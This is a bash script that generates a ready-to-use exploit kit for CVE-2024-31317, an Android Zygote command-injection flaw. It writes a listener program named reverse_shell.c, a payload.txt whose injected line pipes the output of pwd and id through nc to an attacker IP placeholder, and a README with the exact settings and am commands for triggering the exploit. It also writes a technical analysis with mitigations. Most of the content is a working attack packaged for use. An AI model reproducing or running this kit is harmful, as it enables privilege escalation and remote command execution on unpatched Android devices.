#!/bin/bash
#MIT License

#Copyright (c) 2025 Web_LDix

#Permission is hereby granted, free of charge, to any person obtaining a copy
#of this software and associated documentation files (the "Software"), to deal
#in the Software without restriction, including without limitation the rights
#to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
#copies of the Software, and to permit persons to whom the Software is
#furnished to do so, subject to the following conditions:

#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.

#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
#AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
#LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
#OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
#SOFTWARE.
# 📱 Android 本地文件生成脚本
set -e

# 设置输出目录为当前目录
OUTPUT_DIR=$(pwd)
echo -e "\n\033[1;34m📍 所有文件将生成在当前目录: \033[1;36m$OUTPUT_DIR\033[0m"

# 显示部署内容说明
echo -e "\n\033[1;35m=============================================="
echo "🚀 即将部署以下内容："
echo "=============================================="
echo "1. \033[1;31mCVE-2024-31317漏洞利用工具集\033[1;35m"
echo "   - 📅 影响范围: Android 9 到 Android 13"
echo "   - 🔧 修复版本: 2024年6月补丁级别及以后的Android版本"
echo "2. 📂 包含以下文件:"
echo "   - 💻 reverse_shell.c (反向shell程序)"
echo "   - 💣 payload.txt (漏洞利用payload)"
echo "   - 🛠️  compile.sh (编译脚本)"
echo "   - 📖 README.txt (使用说明)"
echo "   - 🔍 CVE-2024-31317.txt (漏洞技术分析)"
echo ""
echo "⚠️ 此漏洞允许通过Zygote进程实现权限提升并执行任意代码"
echo "=============================================="
echo -e "\033[0m"

# 询问用户是否继续
read -p "🤔 是否要继续部署? (y/n): " confirm
if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
    echo -e "\n\033[1;33m🚫 用户取消部署。\033[0m"
    exit 0
fi

# 1. 创建C语言版本的反弹shell程序
cat > "$OUTPUT_DIR/reverse_shell.c" <<'C_SOURCE'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <signal.h>
#include <errno.h>

#define PORT 9981
#define BUFFER_SIZE 1024
#define MAX_CLIENTS 10
#define BACKLOG 5

volatile sig_atomic_t keep_running = 1;

void handle_signal(int sig) {
    keep_running = 0;
}

void handle_client(int client_fd, struct sockaddr_in client_addr) {
    char buffer[BUFFER_SIZE];
    char client_ip[INET_ADDRSTRLEN];
    
    inet_ntop(AF_INET, &(client_addr.sin_addr), client_ip, INET_ADDRSTRLEN);
    printf("客户端已连接: %s:%d\n", client_ip, ntohs(client_addr.sin_port));

    while (1) {
        int bytes_read = recv(client_fd, buffer, BUFFER_SIZE - 1, 0);
        if (bytes_read <= 0) {
            if (bytes_read == 0) {
                printf("客户端 %s:%d 断开连接\n", client_ip, ntohs(client_addr.sin_port));
            } else {
                perror("接收数据错误");
            }
            break;
        }
        
        buffer[bytes_read] = '\0';
        printf("来自 %s:%d 的消息: %s", client_ip, ntohs(client_addr.sin_port), buffer);
        
        // 可以添加命令处理逻辑
        if (strstr(buffer, "exit") != NULL) {
            printf("客户端 %s:%d 请求退出\n", client_ip, ntohs(client_addr.sin_port));
            break;
        }
    }
    
    close(client_fd);
}

int main() {
    
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("创建socket失败");
        exit(EXIT_FAILURE);
    }

    // 设置socket选项
    int opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("设置socket选项失败");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("绑定端口失败");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, BACKLOG) < 0) {
        perror("监听失败");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    printf("服务器已启动，监听端口 %d...\n", PORT);
    printf("按Ctrl+C停止服务器...\n");

    while (keep_running) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        
        int client_fd = accept(server_fd, (struct sockaddr*)&client_addr, &client_len);
        if (client_fd < 0) {
            if (errno == EINTR && !keep_running) {
                break; // 正常退出
            }
            perror("接受连接失败");
            continue;
        }

        // 处理客户端连接
        pid_t pid = fork();
        if (pid < 0) {
            perror("创建子进程失败");
            close(client_fd);
            continue;
        } else if (pid == 0) {
            // 子进程处理客户端
            close(server_fd); // 子进程不需要监听socket
            handle_client(client_fd, client_addr);
            exit(EXIT_SUCCESS);
        } else {
            // 父进程继续监听
            close(client_fd); // 父进程不需要客户端socket
        }
    }

    printf("\n正在关闭服务器...\n");
    close(server_fd);
    printf("服务器已关闭\n");
    return EXIT_SUCCESS;
}
C_SOURCE

echo -e "\n\033[1;32m✅ 已创建C语言反弹shell源码: \033[1;36m$OUTPUT_DIR/reverse_shell.c\033[0m"

# 2. 创建payload文件
cat > "$OUTPUT_DIR/payload.txt" <<'PAYLOAD'





8
--setuid=1000
--setgid=1000
--runtime-args
--seinfo=platform:privapp:targetSdkVersion=30:complete
--runtime-flags=1
--nice-name=zYg0te
--invoke-with
echo "$(pwd ; id)" | nc xxx.xxx.xxx 9981; #
,,,,X
PAYLOAD

echo -e "\033[1;32m✅ 已创建payload文件: \033[1;36m$OUTPUT_DIR/payload.txt\033[0m"

# 3. 创建编译脚本
cat > "$OUTPUT_DIR/compile.sh" <<'COMPILE_SCRIPT'
#!/bin/bash

echo -e "\n\033[1;36m🔧 正在编译reverse_shell.c...\033[0m"
gcc reverse_shell.c -o reverse_shell
chmod +x reverse_shell

if [ -f reverse_shell ]; then
    echo -e "\n\033[1;32m🎉 编译成功！生成的可执行文件: $(pwd)/reverse_shell\033[0m"
else
    echo -e "\n\033[1;31m❌ 编译失败！\033[0m"
    exit 1
fi
COMPILE_SCRIPT

chmod +x "$OUTPUT_DIR/compile.sh"
echo -e "\033[1;32m✅ 已创建编译脚本: \033[1;36m$OUTPUT_DIR/compile.sh\033[0m"

# 4. 创建CVE技术分析文件
cat > "$OUTPUT_DIR/CVE-2024-31317.txt" <<'CVE_DETAILS'
# 🔥 CVE-2024-31317：Android Zygote命令注入漏洞分析

CVE-2024-31317是2024年披露的一个影响Android操作系统的高危漏洞，它允许攻击者通过Zygote进程实现权限提升并执行任意代码。这个漏洞因其影响范围广、利用方式独特而引起了广泛关注。下面我将从漏洞概述、影响版本、修复时间、提权机制以及防护措施等方面进行全面分析。

## 📌 漏洞概述

CVE-2024-31317是一个存在于Android系统服务器中的命令注入漏洞，涉及Zygote进程对"hidden_api_blacklist_exemptions"设置的处理方式。Zygote作为Android系统的核心组件，负责孵化(fork)所有应用程序进程，具有极高的系统权限。

漏洞根源在于系统服务器向Zygote传递"hidden_api_blacklist_exemptions"设置时，未能正确转义换行符，导致攻击者可以向Zygote进程注入任意命令。这种设计缺陷使得拥有WRITE_SECURE_SETTINGS权限的攻击者能够构造恶意命令，以系统级权限执行任意代码。

## 📱 影响版本

该漏洞影响以下Android版本：
- Android 9 (Pie)
- Android 10 (Q)
- Android 11 (R)
- Android 12 (S)
- Android 13 (T)

### ⏰ 修复时间

该漏洞的修复时间线如下：
- 漏洞披露：2024年6月3日首次公开披露
- 官方补丁发布：包含在2024年6月的Android安全公告中
- 华为修复：在2024年7月的安全更新中包含此漏洞补丁
- 全面推送：2024年6月补丁级别及以后的Android版本不再受影响

## 💻 漏洞利用机制

### 🔧 技术原理

1. Zygote进程机制：Android系统中所有应用进程都由Zygote进程fork而来，继承其权限和资源
2. hidden_api_blacklist_exemptions设置：用于控制应用对隐藏API的访问权限
3. 命令注入点：系统服务器向Zygote传递设置时未正确处理换行符，导致命令注入

### ⚠️ 利用条件

1. 攻击者需要WRITE_SECURE_SETTINGS权限
2. 目标设备运行受影响Android版本(9-13)
3. 设备未安装2024年6月安全补丁

### 🛠️ 利用步骤

1. 构造恶意payload，包含要执行的命令
2. 通过settings命令将payload写入hidden_api_blacklist_exemptions
3. 触发Zygote重新读取设置
4. Zygote解析设置时执行注入的命令

## 🛡️ 防护措施

1. 及时更新：安装2024年6月或之后的安全补丁
2. 权限控制：严格控制WRITE_SECURE_SETTINGS权限分配
3. 监控检测：
   - 监控hidden_api_blacklist_exemptions设置的异常修改
   - 检测Zygote进程的异常行为
4. 加固措施：
   - 启用SELinux严格模式
   - 限制Zygote的网络访问

## 📝 漏洞总结

1. 利用Zygote机制：攻击Android核心进程孵化机制。
2. 无需内存破坏：不同于常见的内存破坏漏洞，利用设计缺陷实现攻击。
3. 影响范围广：影响Android 9到13多个版本。
4. 高权限执行：最终可获得系统级权限。
5. 持久化能力：攻击效果可跨越设备重启。
CVE_DETAILS

echo -e "\033[1;32m✅ 已创建CVE技术分析文件: \033[1;36m$OUTPUT_DIR/CVE-2024-31317.txt\033[0m"

# 5. 创建使用说明
cat > "$OUTPUT_DIR/README.txt" <<'README'
📂 文件说明
===========

1. 💻 reverse_shell.c - C语言实现的反向shell程序
   * 需要先编译: ./compile.sh
   * 使用方法: ./reverse_shell

2. 💣 payload.txt - 特殊payload文件
   * 用于CVE-2024-31317漏洞利用
   * 需要替换其中的xxx.xxx.xxx为攻击机IP

3. 🛠️ compile.sh - 自动编译脚本
   * 自动编译reverse_shell.c

4. 🔍 CVE-2024-31317.txt - 漏洞技术分析文档
   * 包含漏洞详细说明和影响范围

⚠️ 漏洞信息
===========

CVE-2024-31317：Android Zygote命令注入漏洞
📅 影响范围: Android 9 到 Android 13
🔧 修复版本: 2024年6月补丁级别及以后的Android版本

🛠️ 反弹shell使用步骤
====================

1. 安装软件包:
   pkg install clang
   
2. 编译C程序:
   ./compile.sh

3. 运行程序:
   ./reverse_shell

💣 漏洞利用步骤
===============

1. 上传payload.txt到目标设备的/data/local/tmp/
 -也可以执行以下指令:
 cp -f payload.txt /storage/emulated/0/
 将文件移到内部储存然后激活shizuku(要保证正常可用)
然后给MT管理器授权然后用MT管理器移动到/data/local/tmp/
2. 执行以下命令序列:
am force-stop com.android.settings
cd /data/local/tmp/
settings put global hidden_api_blacklist_exemptions "$(cat payload.txt)"
am start -n com.android.settings/.Settings
settings put global hidden_api_blacklist_exemptions "null"

🔐 注意事项
===========

1. 此漏洞利用需要WRITE_SECURE_SETTINGS权限
2. 仅适用于未安装2024年6月安全补丁的设备
3. 使用前请确保已获得合法授权
4. 频繁操作可能导致系统不稳定
README

echo -e "\033[1;32m✅ 已创建使用说明: \033[1;36m$OUTPUT_DIR/README.txt\033[0m"

echo -e "\n\033[1;34m📦 所有文件已生成在当前目录:\033[0m"
echo -e "\033[1;35m=============================================="
ls -lh "$OUTPUT_DIR" | grep -E 'reverse_shell.c|payload.txt|compile.sh|README.txt|CVE-2024-31317.txt'
echo -e "=============================================="
echo -e "\033[1;34m📚 请仔细阅读以下文件获取详细信息:\033[0m"
echo -e "1. cat \033[1;36mCVE-2024-31317.txt\033[0m - 查看漏洞技术细节"
echo -e "2. cat \033[1;36mREADME.txt\033[0m - 查看使用说明"
echo -e "\n\033[1;32m🎉 部署完成！\033[0m"